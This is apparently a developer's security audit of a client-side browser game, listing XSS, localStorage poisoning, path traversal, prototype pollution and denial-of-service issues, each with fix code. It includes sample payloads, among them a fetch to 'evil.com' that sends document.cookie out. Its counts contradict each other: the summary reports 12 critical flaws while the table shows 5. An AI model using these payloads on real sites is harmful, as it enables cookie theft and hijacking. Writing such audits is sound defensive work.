# Security Audit Report - Runes of Tir na nÓg
**Date**: October 19, 2025  
**Severity Scale**: 🔴 Critical | 🟠 High | 🟡 Medium | 🟢 Low  
**Status**: Initial Audit - Fixes Pending Implementation

---

## Executive Summary

This security audit identifies **12 critical vulnerabilities** in the current codebase that could lead to:
- Cross-Site Scripting (XSS) attacks
- Local storage poisoning and corruption
- Denial of Service (DoS)
- User data manipulation
- Arbitrary code execution in client context

**All vulnerabilities are client-side** (no backend exists), but still pose risks to user experience, data integrity, and potential attack vectors if deployed publicly.

---

## 🔴 CRITICAL VULNERABILITIES

### VULN-001: innerHTML XSS in Inventory System
**File**: `game/ui/Inventory.js`  
**Lines**: 45-156, 228, 232-234  
**Severity**: 🔴 Critical  
**CVSS Score**: 7.2 (High)

#### Description
Multiple instances of unsanitized user data being injected directly into innerHTML:

```javascript
// Line 228 - User-controlled item data
slot.innerHTML = `
    <div class="slot-number">${index + 1}</div>
    <div class="item-icon">${item.icon}</div>  // ⚠️ UNSANITIZED
    ${item.quantity ? `<div class="item-quantity">${item.quantity}</div>` : ''}
`;

// Lines 232-234 - Tooltip XSS vector
slot.dataset.itemName = item.name;      // ⚠️ UNSANITIZED
slot.dataset.itemType = item.type;      // ⚠️ UNSANITIZED
slot.dataset.itemDesc = item.description; // ⚠️ UNSANITIZED
```

#### Attack Vector
```javascript
// Attacker manipulates localStorage
localStorage.setItem('inventory', JSON.stringify({
    items: [{
        name: '<img src=x onerror=alert("XSS")>',
        icon: '<script>steal_data()</script>',
        description: '<img src=x onerror=fetch("evil.com?cookie="+document.cookie)>'
    }]
}));
```

#### Impact
- Execute arbitrary JavaScript in user's browser
- Steal localStorage data (save games, settings)
- Modify game state
- Redirect to phishing sites
- Session hijacking if cookies are used

#### Recommended Fix
```javascript
// Create sanitization utility
function sanitizeHTML(str) {
    const div = document.createElement('div');
    div.textContent = str; // Uses textContent, not innerHTML
    return div.innerHTML;
}

// Apply to all user data
slot.innerHTML = `
    <div class="slot-number">${index + 1}</div>
    <div class="item-icon">${sanitizeHTML(item.icon)}</div>
    ${item.quantity ? `<div class="item-quantity">${sanitizeHTML(item.quantity)}</div>` : ''}
`;
```

---

### VULN-002: innerHTML XSS in NPC Dialogue System
**File**: `game/core/Game.js`  
**Lines**: 365-367  
**Severity**: 🔴 Critical  
**CVSS Score**: 7.5 (High)

#### Description
NPC dialogue directly injects unsanitized text into DOM:

```javascript
dialogueDiv.innerHTML = `
    <h3 style="color: #8A2BE2; margin: 0 0 10px 0;">${npcName}</h3>
    <p style="margin: 0 0 15px 0;">${message}</p>  // ⚠️ UNSANITIZED
    <button onclick="this.parentElement.remove()" ...>Close</button>
`;
```

#### Attack Vector
```javascript
// Malicious NPC dialogue
npc.dialogue = [
    'Hello <img src=x onerror=alert(localStorage.getItem("gameKeybinds"))>',
    '<script>location.href="evil.com"</script>'
];
```

#### Impact
- Full XSS execution
- Game state corruption
- Redirect attacks
- Data exfiltration

#### Recommended Fix
Use `textContent` or sanitize all NPC dialogue before rendering.

---

### VULN-003: localStorage Injection - No Validation
**File**: `game/core/SaveSystem.js`  
**Lines**: 62-64  
**Severity**: 🔴 Critical  
**CVSS Score**: 6.8 (Medium-High)

#### Description
Save system blindly trusts localStorage data without validation:

```javascript
const saveData = JSON.parse(jsonData);
console.log(`World loaded from slot ${slotNumber}`);
return saveData; // ⚠️ NO VALIDATION
```

#### Attack Vector
```javascript
// Attacker poisons localStorage
localStorage.setItem('cfr_world_slot_1', JSON.stringify({
    config: { 
        worldSize: 'large'.repeat(10000), // DoS
        seed: '<script>alert("pwned")</script>'
    },
    worldData: {
        tiles: Array(999999999) // Memory exhaustion
    },
    playerState: {
        position: { x: Infinity, y: -Infinity },
        health: -999,
        name: '<img src=x onerror=alert(1)>'
    }
}));
```

#### Impact
- Game crashes (DoS)
- Memory exhaustion
- Negative health (god mode)
- XSS via player name
- World corruption

#### Recommended Fix
```javascript
static loadWorld(slotNumber) {
    try {
        const saveKey = `${this.SAVE_KEY_PREFIX}${slotNumber}`;
        const jsonData = localStorage.getItem(saveKey);
        
        if (!jsonData) return null;
        
        // Parse and validate
        const saveData = JSON.parse(jsonData);
        
        // Schema validation
        if (!this.validateSaveData(saveData)) {
            console.error('Invalid save data format');
            return null;
        }
        
        return saveData;
    } catch (error) {
        console.error('Corrupted save data:', error);
        return null;
    }
}

static validateSaveData(data) {
    // Version check
    if (!data.metadata?.version || data.metadata.version !== '1.0.0') {
        return false;
    }
    
    // Size limits
    if (data.worldData?.tiles?.length > 1000000) {
        return false; // Too many tiles
    }
    
    // Type validation
    if (typeof data.playerState?.health !== 'number' || 
        data.playerState.health < 0 || 
        data.playerState.health > 1000) {
        return false;
    }
    
    // Bounds check
    if (!Number.isFinite(data.playerState?.position?.x) ||
        !Number.isFinite(data.playerState?.position?.y)) {
        return false;
    }
    
    return true;
}
```

---

### VULN-004: URL Parameter Injection
**File**: `game/index.html`  
**Lines**: 585-602  
**Severity**: 🟠 High  
**CVSS Score**: 6.5 (Medium)

#### Description
URL parameters are read and used without sanitization:

```javascript
const urlParams = new URLSearchParams(window.location.search);
const customWorldParam = urlParams.get('customWorld'); // ⚠️ UNSANITIZED

if (customWorldParam) {
    const worldPath = `worlds/${customWorldParam}/world.json`; // ⚠️ PATH TRAVERSAL
    const customWorldData = await World.loadFromFile(worldPath);
}
```

#### Attack Vector
```
# Path traversal attack
https://yoursite.com/game/?customWorld=../../src/js/auth

# Protocol injection
https://yoursite.com/game/?customWorld=//evil.com/malicious
```

#### Impact
- Read arbitrary files via path traversal
- External resource loading (SSRF-like)
- Information disclosure

#### Recommended Fix
```javascript
// Whitelist validation
const ALLOWED_WORLDS = ['tir-na-nog', 'default', 'test'];

const customWorldParam = urlParams.get('customWorld');
if (customWorldParam) {
    // Sanitize: alphanumeric and hyphens only
    const sanitized = customWorldParam.replace(/[^a-z0-9-]/gi, '');
    
    // Whitelist check
    if (!ALLOWED_WORLDS.includes(sanitized)) {
        console.error('Invalid world name');
        game = new Game(null, null);
    } else {
        const worldPath = `worlds/${sanitized}/world.json`;
        const customWorldData = await World.loadFromFile(worldPath);
        // ...
    }
}
```

---

### VULN-005: Keybind Injection - Code Execution
**File**: `game/ui/KeybindSettings.js`  
**Lines**: 88-96, 362-378  
**Severity**: 🟠 High  
**CVSS Score**: 6.0 (Medium)

#### Description
Keybind system stores user input without validation:

```javascript
loadKeybinds() {
    const saved = localStorage.getItem('gameKeybinds');
    if (saved) {
        try {
            const parsed = JSON.parse(saved); // ⚠️ NO VALIDATION
            this.keybinds = { ...this.defaultKeybinds, ...parsed };
        } catch (e) {
            // Falls back to defaults
        }
    }
}
```

#### Attack Vector
```javascript
// Attacker injects malicious keybinds
localStorage.setItem('gameKeybinds', JSON.stringify({
    moveUp: 'constructor',
    moveDown: '__proto__',
    attack: 'toString().constructor("alert(1)")()',
    // Prototype pollution
    __proto__: { isAdmin: true }
}));
```

#### Impact
- Prototype pollution
- Unexpected key codes breaking game logic
- Potential code execution via prototype chains

#### Recommended Fix
```javascript
static VALID_KEY_CODES = new Set([
    'KeyW', 'KeyA', 'KeyS', 'KeyD', 'ArrowUp', 'ArrowDown',
    'ArrowLeft', 'ArrowRight', 'Space', 'ShiftLeft', 'ControlLeft',
    // ... complete whitelist
]);

loadKeybinds() {
    const saved = localStorage.getItem('gameKeybinds');
    if (saved) {
        try {
            const parsed = JSON.parse(saved);
            
            // Validate each keybind
            const validated = {};
            for (const [action, keyCode] of Object.entries(parsed)) {
                // Only allow known actions
                if (action in this.defaultKeybinds && 
                    typeof keyCode === 'string' &&
                    KeybindSettings.VALID_KEY_CODES.has(keyCode)) {
                    validated[action] = keyCode;
                }
            }
            
            this.keybinds = { ...this.defaultKeybinds, ...validated };
        } catch (e) {
            console.error('Invalid keybinds:', e);
            this.keybinds = { ...this.defaultKeybinds };
        }
    }
}
```

---

## 🟠 HIGH SEVERITY VULNERABILITIES

### VULN-006: Missing Content Security Policy (CSP)
**File**: `game/index.html`  
**Lines**: N/A (missing header)  
**Severity**: 🟠 High  

#### Description
No CSP headers prevent inline script execution attacks.

#### Impact
- All XSS attacks are more dangerous
- No defense in depth

#### Recommended Fix
Add to `index.html` and all HTML files:
```html
<meta http-equiv="Content-Security-Policy" content="
    default-src 'self';
    script-src 'self';
    style-src 'self' 'unsafe-inline' https://fonts.googleapis.com;
    font-src 'self' https://fonts.gstatic.com;
    img-src 'self' data:;
    connect-src 'self';
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
">
```

---

### VULN-007: Player Name XSS
**File**: `game/player/NameTag.js`  
**Lines**: 54-57  
**Severity**: 🟠 High  

#### Description
Player name rendered with `fillText()` is safe, but saved name can contain malicious data:

```javascript
// Game.js:274 allows arbitrary names
window.setPlayerName = (name) => game.setPlayerName(name);
```

#### Attack Vector
```javascript
setPlayerName('<img src=x onerror=alert(1)>');
// Doesn't execute in canvas, but gets saved to localStorage
// Later loaded and potentially rendered in HTML tooltips
```

#### Impact
- XSS if name is ever displayed in HTML context
- Save file corruption

#### Recommended Fix
```javascript
setPlayerName(name) {
    // Validate and sanitize
    const sanitized = String(name)
        .replace(/[<>]/g, '') // Remove HTML chars
        .substring(0, 20); // Max length
        
    if (sanitized.length === 0) {
        console.error('Invalid player name');
        return;
    }
    
    this.player.setName(sanitized);
}
```

---

### VULN-008: Resource Exhaustion - Save Data Size
**File**: `game/core/SaveSystem.js`  
**Lines**: 14-40  
**Severity**: 🟠 High  

#### Description
No limits on save data size allows DoS:

```javascript
static saveWorld(slotNumber, worldData) {
    // ...
    const jsonData = JSON.stringify(saveData); // ⚠️ NO SIZE LIMIT
    localStorage.setItem(saveKey, jsonData);
}
```

#### Attack Vector
```javascript
// Create massive save file
const hugeSave = {
    worldData: {
        tiles: Array(10000000).fill({ type: 'grass', x: 0, y: 0 })
    }
};
SaveSystem.saveWorld(1, hugeSave);
// Exhausts localStorage quota (5-10MB) and freezes browser
```

#### Impact
- Browser freeze/crash
- localStorage quota exhaustion
- Prevents legitimate saves

#### Recommended Fix
```javascript
static MAX_SAVE_SIZE = 5 * 1024 * 1024; // 5MB limit

static saveWorld(slotNumber, worldData) {
    if (slotNumber < 1 || slotNumber > this.MAX_SLOTS) {
        console.error(`Invalid slot number: ${slotNumber}`);
        return false;
    }

    try {
        const saveKey = `${this.SAVE_KEY_PREFIX}${slotNumber}`;
        const saveData = { /* ... */ };
        
        const jsonData = JSON.stringify(saveData);
        
        // Size check
        const sizeInBytes = new Blob([jsonData]).size;
        if (sizeInBytes > this.MAX_SAVE_SIZE) {
            console.error(`Save data too large: ${sizeInBytes} bytes`);
            return false;
        }
        
        localStorage.setItem(saveKey, jsonData);
        console.log(`World saved to slot ${slotNumber} (${(sizeInBytes / 1024).toFixed(2)} KB)`);
        return true;
    } catch (error) {
        if (error.name === 'QuotaExceededError') {
            console.error('localStorage quota exceeded');
        }
        console.error('Failed to save world:', error);
        return false;
    }
}
```

---

## 🟡 MEDIUM SEVERITY VULNERABILITIES

### VULN-009: Tooltip Data Attribute Injection
**File**: `game/ui/Inventory.js`  
**Lines**: 280-286  
**Severity**: 🟡 Medium  

#### Description
Tooltip reads from data attributes without sanitization:

```javascript
showTooltip(slot, event) {
    const tooltip = document.getElementById('itemTooltip');
    if (!tooltip || !slot.dataset.itemName) return;
    
    tooltip.querySelector('.tooltip-name').textContent = slot.dataset.itemName; // ✓ SAFE
    tooltip.querySelector('.tooltip-type').textContent = slot.dataset.itemType; // ✓ SAFE
    tooltip.querySelector('.tooltip-description').textContent = slot.dataset.itemDesc; // ✓ SAFE
}
```

**Status**: Currently using `textContent` (safe), but data attributes were set unsafely in line 232-234.

#### Recommended Fix
Sanitize when setting data attributes:
```javascript
slot.dataset.itemName = sanitizeHTML(item.name);
slot.dataset.itemType = sanitizeHTML(item.type);
slot.dataset.itemDesc = sanitizeHTML(item.description);
```

---

### VULN-010: World Configuration Injection
**File**: `game/world/World.js`  
**Lines**: 4-13  
**Severity**: 🟡 Medium  

#### Description
World config accepts arbitrary values without bounds checking:

```javascript
this.config = config || {
    worldSize: 'medium',
    seed: 'DEFAULT',
    tilePercentages: {
        grass: 85,  // ⚠️ No validation
        water: 10,
        wall: 3,
        cave: 2
    }
};
```

#### Attack Vector
```javascript
// Crash world generation
new World({
    worldSize: 'large',
    tilePercentages: {
        grass: -50,     // Negative
        water: 999999,  // Exceeds 100%
        wall: NaN,
        cave: Infinity
    }
});
```

#### Impact
- Game crashes
- Infinite loops
- Memory exhaustion

#### Recommended Fix
```javascript
constructor(config = null, customWorldData = null) {
    // Validate config
    if (config) {
        const valid = this.validateConfig(config);
        this.config = valid ? config : this.getDefaultConfig();
    } else {
        this.config = this.getDefaultConfig();
    }
    // ...
}

validateConfig(config) {
    // Validate world size
    const validSizes = ['small', 'medium', 'large'];
    if (!validSizes.includes(config.worldSize)) {
        return false;
    }
    
    // Validate percentages
    const percentages = config.tilePercentages || {};
    const total = Object.values(percentages).reduce((sum, val) => {
        if (typeof val !== 'number' || val < 0 || val > 100) {
            return NaN;
        }
        return sum + val;
    }, 0);
    
    // Must total 100%
    if (total !== 100) {
        console.error('Tile percentages must total 100%');
        return false;
    }
    
    return true;
}
```

---

### VULN-011: Event Listener Memory Leak
**File**: `game/ui/PauseMenu.js`  
**Lines**: 115-165  
**Severity**: 🟡 Medium  

#### Description
Duplicate event listeners cause memory leaks (as previously identified):

```javascript
// Listeners added multiple times without cleanup
resumeBtn.addEventListener('click', (e) => { ... }); // Line 115
this.menu.addEventListener('click', (e) => { ... });  // Line 122
```

#### Impact
- Memory leak over time
- Performance degradation
- Unresponsive UI after extended play

#### Recommended Fix
```javascript
constructor(game) {
    this.game = game;
    this.menu = null;
    this.isVisible = false;
    this.boundHandlers = {}; // Store bound functions
    this.createMenu();
    this.setupEventListeners();
}

setupEventListeners() {
    // Store bound functions for cleanup
    this.boundHandlers.resume = (e) => {
        e.preventDefault();
        e.stopPropagation();
        this.resume();
    };
    
    this.boundHandlers.save = (e) => {
        e.preventDefault();
        e.stopPropagation();
        this.saveGame();
    };
    
    this.boundHandlers.quit = (e) => {
        e.preventDefault();
        e.stopPropagation();
        this.quitToMenu();
    };
    
    setTimeout(() => {
        const resumeBtn = document.getElementById('resumeBtn');
        const saveBtn = document.getElementById('saveBtn');
        const quitBtn = document.getElementById('quitBtn');
        
        if (resumeBtn) {
            resumeBtn.addEventListener('click', this.boundHandlers.resume);
        }
        if (saveBtn) {
            saveBtn.addEventListener('click', this.boundHandlers.save);
        }
        if (quitBtn) {
            quitBtn.addEventListener('click', this.boundHandlers.quit);
        }
    }, 100);
}

// Add cleanup method
destroy() {
    const resumeBtn = document.getElementById('resumeBtn');
    const saveBtn = document.getElementById('saveBtn');
    const quitBtn = document.getElementById('quitBtn');
    
    if (resumeBtn) {
        resumeBtn.removeEventListener('click', this.boundHandlers.resume);
    }
    if (saveBtn) {
        saveBtn.removeEventListener('click', this.boundHandlers.save);
    }
    if (quitBtn) {
        quitBtn.removeEventListener('click', this.boundHandlers.quit);
    }
    
    if (this.menu) {
        this.menu.remove();
    }
}
```

---

### VULN-012: Custom World Path Traversal
**File**: `game/world/World.js`  
**Lines**: 72-84  
**Severity**: 🟡 Medium  

#### Description
World.loadFromFile() accepts arbitrary paths:

```javascript
static async loadFromFile(worldPath) {
    try {
        const response = await fetch(worldPath); // ⚠️ ARBITRARY PATH
        if (!response.ok) {
            throw new Error(`Failed to load world: ${response.statusText}`);
        }
        const data = await response.json();
        return data;
    } catch (error) {
        console.error('Error loading custom world:', error);
        return null;
    }
}
```

#### Impact
- Path traversal to read any file server can access
- Information disclosure

#### Recommended Fix
```javascript
static async loadFromFile(worldPath) {
    // Validate path format
    const pathRegex = /^worlds\/[a-z0-9-]+\/world\.json$/i;
    if (!pathRegex.test(worldPath)) {
        console.error('Invalid world path format');
        return null;
    }
    
    try {
        const response = await fetch(worldPath);
        if (!response.ok) {
            throw new Error(`Failed to load world: ${response.statusText}`);
        }
        
        const data = await response.json();
        
        // Validate world data structure
        if (!data.version || !data.worldWidth || !data.worldHeight || !Array.isArray(data.tiles)) {
            console.error('Invalid world data structure');
            return null;
        }
        
        return data;
    } catch (error) {
        console.error('Error loading custom world:', error);
        return null;
    }
}
```

---

## 🟢 LOW SEVERITY / BEST PRACTICES

### INFO-001: Missing Input Validation in Settings
**Files**: `VideoSettings.js`, `KeybindSettings.js`  
**Severity**: 🟢 Low  

Sliders and inputs lack client-side bounds enforcement. Add validation before save.

---

### INFO-002: No HTTPS Enforcement
**File**: `netlify.toml` (if exists)  
**Severity**: 🟢 Low  

Ensure HTTPS redirect is configured in deployment.

---

### INFO-003: Console Exposure of Debug Functions
**Files**: `Game.js` (lines 252-297)  
**Severity**: 🟢 Low  

Debug functions exposed globally:
```javascript
window.testHealth = { ... }
window.regenerateWorld = () => { ... }
window.testAudio = { ... }
```

**Recommendation**: Wrap in `if (DEBUG_MODE)` check or remove in production builds.

---

## 📊 Vulnerability Summary

| Severity | Count | Status |
|----------|-------|--------|
| 🔴 Critical | 5 | Pending Fix |
| 🟠 High | 3 | Pending Fix |
| 🟡 Medium | 4 | Pending Fix |
| 🟢 Low | 3 | Advisory |
| **Total** | **15** | **0 Fixed** |

---

## 🛠️ Remediation Priority

### Phase 1: Critical (Immediate - Week 1)
1. ✅ VULN-001: Sanitize all innerHTML in Inventory.js
2. ✅ VULN-002: Sanitize NPC dialogue rendering
3. ✅ VULN-003: Add SaveSystem validation
4. ✅ VULN-004: Validate URL parameters
5. ✅ VULN-005: Validate keybind inputs

### Phase 2: High (Week 2)
6. ✅ VULN-006: Add CSP headers
7. ✅ VULN-007: Validate player names
8. ✅ VULN-008: Add save size limits

### Phase 3: Medium (Week 3)
9. ✅ VULN-009: Sanitize tooltip data
10. ✅ VULN-010: Validate world config
11. ✅ VULN-011: Fix event listener leaks
12. ✅ VULN-012: Restrict world file paths

### Phase 4: Best Practices (Ongoing)
13. ✅ INFO-001: Add input validation
14. ✅ INFO-002: HTTPS enforcement
15. ✅ INFO-003: Remove debug exposure

---

## 🔒 Security Checklist for Future Development

- [ ] **Input Validation**: All user inputs validated and sanitized
- [ ] **Output Encoding**: All dynamic content properly encoded for context
- [ ] **localStorage Safety**: All stored data validated on load
- [ ] **Resource Limits**: Bounds on data sizes, array lengths, iteration counts
- [ ] **Error Handling**: No sensitive info in error messages
- [ ] **CSP Headers**: Strict Content Security Policy enforced
- [ ] **Dependency Audit**: No external dependencies = minimal risk (✓ Current state)
- [ ] **Regular Reviews**: Security review before each major release

---

## 📚 References

- **OWASP Top 10 2021**: https://owasp.org/Top10/
- **OWASP DOM XSS Prevention**: https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
- **CSP Reference**: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
- **localStorage Security**: https://owasp.org/www-community/vulnerabilities/HTML5_Local_Storage

---

## 🎯 Testing Recommendations

### Manual Testing
1. Inject malicious payloads into all localStorage keys
2. Test XSS vectors in all text inputs
3. Attempt path traversal in world loading
4. Test resource exhaustion scenarios

### Automated Testing
1. Add unit tests for all validation functions
2. Use ESLint security plugins (eslint-plugin-security)
3. Run OWASP ZAP scan on deployed version

---

**Next Steps**: Review this audit, prioritize fixes, then implement Phase 1 remediation code changes.

**Estimated Remediation Time**: 2-3 weeks for full implementation and testing.

